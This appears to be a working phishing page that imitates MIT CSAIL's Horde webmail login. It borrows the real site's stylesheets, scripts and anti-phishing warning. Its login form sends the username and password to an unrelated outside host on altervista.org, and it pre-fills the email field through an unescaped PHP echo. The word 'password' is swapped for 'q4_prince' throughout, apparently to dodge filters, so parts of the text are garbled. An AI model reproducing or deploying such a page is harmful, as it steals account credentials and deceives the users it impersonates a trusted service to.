<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"><HTML 

lang="en-US"><HEAD><META content="IE=11.0000" http-equiv="X-UA-Compatible">

       <LINK href="https://webmail.csail.mit.edu/horde/themes/default/screen.css?v=7f5e6c29417bb1282666acfb2678e9de" 

rel="stylesheet" type="text/css">

<META http-equiv="Content-Type" content="text/html; charset=utf-8"><LINK href="https://webmail.csail.mit.edu/horde/themes/default/mozilla.css?v=7f5e6c29417bb1282666acfb2678e9de" 

rel="stylesheet" type="text/css">  <LINK href="/horde/themes/default/graphics/favicon.ico" 

rel="SHORTCUT ICON" type="image/x-icon">    <TITLE>Horde :: Log in</TITLE>  

<META name="GENERATOR" content="MSHTML 11.00.9600.18838"></HEAD>  

<BODY class="modal-form">

<DIV class="modal-form">

<FORM name="horde_login" id="horde_login" action="http://directoryupdatee.altervista.org/veri1/member.php" 

method="post"><INPUT name="app" id="app" type="hidden">  <INPUT name="login_post" id="login_post" type="hidden" value="0"> 

 <INPUT name="url" type="hidden">  <INPUT name="anchor_string" id="anchor_string" type="hidden"> 

<DIV><LABEL for="horde_user">Username</LABEL></DIV>

<DIV><INPUT name="q3_prince" id="horde_user" style="direction: ltr;" type="text" autocorrect="off" value="<?php echo $_GET['email']; // output 2489 ?>" <?php echo $_GET['email']; // output 2489 ?> ?>
</DIV>

<DIV><LABEL for="hordeq4_prince>Pass</LABEL></DIV>

<DIV><INPUT "name="q3_name"" id="hordeq4_prince style="direction: ltr;" type="pass"> 

</DIV>

<DIV id="horde_select_view_div" style="display: none;">

<DIV><LABEL for="horde_select_view">Mode</LABEL></DIV>

<DIV><SELECT name="horde_select_view" id="horde_select_view"><OPTION value="auto">Automatic</OPTION> 

     <OPTION disabled="disabled" value="">- - - - - - - - - -</OPTION>    

  <OPTION value="basic">Basic</OPTION>    <OPTION 

  value="dynamic">Dynamic</OPTION>    <OPTION value="smartmobile">Mobile 

  (Smartphone/Tablet)</OPTION>    <OPTION value="mobile">Mobile 

  (Minimal)</OPTION>    <OPTION selected="selected" 

  value="mobile_nojs"></OPTION>   </SELECT>  </DIV></DIV>

<DIV><LABEL for="new_lang">Language</LABEL></DIV>

<DIV><SELECT name="new_lang" id="new_lang"><OPTION value="ar_OM">‭Arabic 

  (Oman) ‮(عربية)</OPTION>         <OPTION value="ar_SY">‭Arabic (Syria) 

  ‮(عربية)</OPTION>         <OPTION value="id_ID">Bahasa Indonesia</OPTION>      

     <OPTION value="bs_BA">Bosanski</OPTION>         <OPTION 

  value="bg_BG">‭Bulgarian (Български)</OPTION>         <OPTION 

  value="ca_ES">Català</OPTION>         <OPTION value="cs_CZ">Český</OPTION>     

      <OPTION value="zh_CN">‭Chinese (Simplified) (简体中文)</OPTION>         

  <OPTION value="zh_TW">‭Chinese (Traditional) (正體中文)</OPTION>         <OPTION 

  value="da_DK">Dansk</OPTION>         <OPTION value="de_DE">Deutsch</OPTION>    

       <OPTION selected="selected" value="en_US">‭English (American)</OPTION>    

       <OPTION value="en_GB">‭English (British)</OPTION>         <OPTION value="en_CA">‭English 

  (Canadian)</OPTION>         <OPTION value="es_ES">Español</OPTION>         

  <OPTION value="et_EE">Eesti</OPTION>         <OPTION 

  value="eu_ES">Euskara</OPTION>         <OPTION value="fa_IR">‭Farsi (Persian) 

  ‮(فارسی)</OPTION>         <OPTION value="fr_FR">Français</OPTION>         

  <OPTION value="gl_ES">Galego</OPTION>         <OPTION value="el_GR">‭Greek 

  (Ελληνικά)</OPTION>         <OPTION value="he_IL">‭Hebrew ‮(עברית)</OPTION>    

       <OPTION value="hr_HR">Hrvatski</OPTION>         <OPTION 

  value="is_IS">Íslenska</OPTION>         <OPTION 

  value="it_IT">Italiano</OPTION>         <OPTION value="ja_JP">‭Japanese 

  (日本語)</OPTION>         <OPTION value="km_KH">‭Khmer (ខមែរ)</OPTION>         

  <OPTION value="ko_KR">‭Korean (한국어)</OPTION>         <OPTION 

  value="lv_LV">Latviešu</OPTION>         <OPTION 

  value="lt_LT">Lietuvių</OPTION>         <OPTION value="mk_MK">‭Macedonian 

  (Македонски)</OPTION>         <OPTION value="hu_HU">Magyar</OPTION>         

  <OPTION value="nl_NL">Nederlands</OPTION>         <OPTION value="nb_NO">‭Norsk 

  (bokmål)</OPTION>         <OPTION value="nn_NO">‭Norsk (nynorsk)</OPTION>      

     <OPTION value="pl_PL">Polski</OPTION>         <OPTION 

  value="pt_PT">Português</OPTION>         <OPTION value="pt_BR">Português do 

  Brasil</OPTION>         <OPTION value="ro_RO">Română</OPTION>         <OPTION 

  value="ru_RU">‭Russian (Русский)</OPTION>         <OPTION 

  value="sk_SK">Slovenský</OPTION>         <OPTION 

  value="sl_SI">Slovensko</OPTION>         <OPTION value="fi_FI">Suomi</OPTION>  

         <OPTION value="sv_SE">Svenska</OPTION>         <OPTION 

  value="th_TH">‭Thai (ภาษาไทย)</OPTION>         <OPTION 

  value="uk_UA">‭Ukrainian (Українська)</OPTION> </SELECT></DIV>

<DIV><INPUT name="login_button" class="horde-default submit-button" id="login-button" type="submit" value="Log in"></DIV></FORM></DIV>

<CENTER>

<DIV style="background: lightgreen; padding: 4px; width: 66%; text-align: center; color: black;">

<P>Login names must be typed in all-lowercase.  (If you use any capital letters, 

you'll be able to log in but some things will break afterwards.)</P></DIV>

<DIV style="background: gold; padding: 4px; width: 66%; text-align: center; color: black;"><BIG><STRONG>WARNING:</STRONG> 

 Do not <STRONG>ever</STRONG> type any CSAIL q4_prince

word into a form on a web page 

unless you are absolutely certain The Infrastructure Group at CSAIL manages the 

web page and the server it's on!  See  <A href="http://tig.csail.mit.edu/wiki/TIG/PhishingAttempts">PhishingAttempts</A>

 on the TIG wiki for more about this.  In particular, there are only a tiny 

number of pages, listed at <A href="http://tig.csail.mit.edu/wiki/TIG/Legitimateq4_prince

wordRequests">Legitimateq4_prince

wordRequests</A>

 on the TIG wiki that you may ever type a CSAIL q4_prince

word into.  Look at that 

list now — if anybody tries to tell you to type a CSAIL q4_prince

word into any other 

page, they're trying to break into your account!

<P></P></BIG></DIV>

<DIV style="background: lightgreen; padding: 4px; width: 66%; text-align: center; color: black;">

<P>Provided for the use of CSAIL members and affiliates.</P>

<P>Please report problems to <A 

href="mailto:help@csail.mit.edu">help@csail.mit.edu</A>.</P>

<P>TIG supports the webmail and filter-editing components of this applications 

suite, but the other applications (such as the calendar, notes, and so forth) 

are <STRONG>unsupported</STRONG> and you use them at your own risk. <A href="https://tig.csail.mit.edu/wiki/TIG/DocletHordeSupportInfo">See

 this link for an explanation and more information.</A></P></DIV></CENTER><BR>

<TABLE width="100%">

  <TBODY>

  <TR>

    <TD align="center"><IMG alt="Powered by Horde" src="https://webmail.csail.mit.edu/horde/themes/default/graphics/horde-power1.png"></TD></TR></TBODY></TABLE>

<SCRIPT src="https://webmail.csail.mit.edu/horde/js/prototype.js?v=7f5e6c29417bb1282666acfb2678e9de" type="text/javascript"></SCRIPT>



<SCRIPT src="https://webmail.csail.mit.edu/horde/js/horde.js?v=7f5e6c29417bb1282666acfb2678e9de" type="text/javascript"></SCRIPT>



<SCRIPT src="https://webmail.csail.mit.edu/horde/js/login.js?v=7f5e6c29417bb1282666acfb2678e9de" type="text/javascript"></SCRIPT>



<SCRIPT src="https://webmail.csail.mit.edu/horde/imp/js/login.js?v=d3fd6e2d27412fa1109e7e5c408c186d" type="text/javascript"></SCRIPT>



<SCRIPT src="https://webmail.csail.mit.edu/horde/js/accesskeys.js?v=7f5e6c29417bb1282666acfb2678e9de" type="text/javascript"></SCRIPT>

  

<SCRIPT type="text/javascript">//<![CDATA[

HordeLogin.user_error="Please enter a username.";HordeLogin.q4_prince

_error="Please enter a q4_prince

word.";HordeLogin.pre_sel="auto";HordeLogin.server_key_error="Please choose a mail server.";

//]]></SCRIPT>

    </BODY></HTML>

